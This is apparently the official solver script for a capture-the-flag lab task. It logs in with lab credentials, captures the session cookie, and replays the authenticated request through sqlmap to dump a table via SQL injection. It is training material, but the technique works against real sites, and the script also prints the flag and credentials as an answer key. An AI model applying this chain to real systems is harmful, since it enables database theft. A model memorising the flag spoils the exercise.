#!/usr/bin/env bash
# solvers/p2_4.sh: Task 2.4 "The Warden's Ledger" canonical exploit.
#
# The injectable lookup (`cell_id`, string-concatenated into
#   SELECT cell_id,name,status FROM prisoners WHERE cell_id='{cell_id}'
# ) only runs for a request that already carries a valid warden session.
# An unauthenticated probe (the reflex `-u ".../p2/ledger?cell_id=1"`) sees
# only the login gate, so sqlmap finds nothing. The lesson of this floor is
# how to point sqlmap at an injection that lives behind authentication:
#   1. log in and capture the session cookie
#   2. save the *authenticated* request (POST body + Cookie) to a file
#   3. replay it with sqlmap's -r (equivalently --data + --cookie)
# then run the normal enumeration/dump chain through it.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{replay_the_signed_request}"
HOST="${BASE#http://}"; HOST="${HOST#https://}"

WORKDIR=$(mktemp -d)
REQ="${WORKDIR}/req.txt"
JAR="${WORKDIR}/cookies.txt"
OUTDIR="${WORKDIR}/sqlmap-out"
LOG="${WORKDIR}/sqlmap.log"
trap 'rm -rf "$WORKDIR"' EXIT

# --- Step 0: prove the injection is unreachable without a session ---------
echo "[p2_4] step 0: an unauthenticated lookup never reaches the query"
anon=$(curl -s -G "${BASE}/p2/ledger" --data-urlencode "cell_id=1")
if echo "$anon" | grep -qi "sign in to open the ledger"; then
    echo "  ok: without a session the route only shows the login gate"
else
    echo "[p2_4] FAIL: expected the login gate for an unauthenticated request"
    exit 1
fi

# --- Step 1: log in and capture the session cookie ------------------------
echo "[p2_4] step 1: log in at the warden booth and capture the session cookie"
curl -s -c "$JAR" -o /dev/null \
    --data "username=warden&password=tower-key-7" \
    "${BASE}/p2/ledger/login"
SESSION=$(awk '/\tsession\t/ {print $7}' "$JAR" | tail -1)
if [[ -z "$SESSION" ]]; then
    echo "[p2_4] FAIL: no session cookie issued (login may have failed)"
    exit 1
fi
echo "  ok: got session cookie (session=${SESSION:0:24}...)"

# --- Step 2: save the authenticated request for sqlmap to replay ----------
BODY="cell_id=1"
cat > "$REQ" <<EOF
POST /p2/ledger HTTP/1.1
Host: ${HOST}
User-Agent: seiyaku-arc-solver
Accept: */*
Content-Type: application/x-www-form-urlencoded
Cookie: session=${SESSION}
Content-Length: ${#BODY}
Connection: close

${BODY}
EOF
echo "[p2_4] step 2: saved the authenticated POST request to ${REQ}"

# --- Step 3: drive sqlmap through the authenticated request ----------------
echo "[p2_4] step 3: sqlmap -r req.txt -p cell_id --dump -T warden_vault"
sqlmap -r "$REQ" -p cell_id --batch --ignore-stdin --dump -T warden_vault \
    --output-dir="$OUTDIR" 2>&1 | tee "$LOG" >/dev/null

if grep -qF "$FLAG" "$LOG" || grep -rqF "$FLAG" "$OUTDIR" 2>/dev/null; then
    echo "  ok: flag recovered from sqlmap's dump of warden_vault: ${FLAG}"
    echo "[p2_4] PASS"
    exit 0
else
    echo "[p2_4] FAIL: flag not found in sqlmap output or dump files"
    echo "---- last 30 lines of sqlmap output ----"
    tail -30 "$LOG"
    exit 1
fi
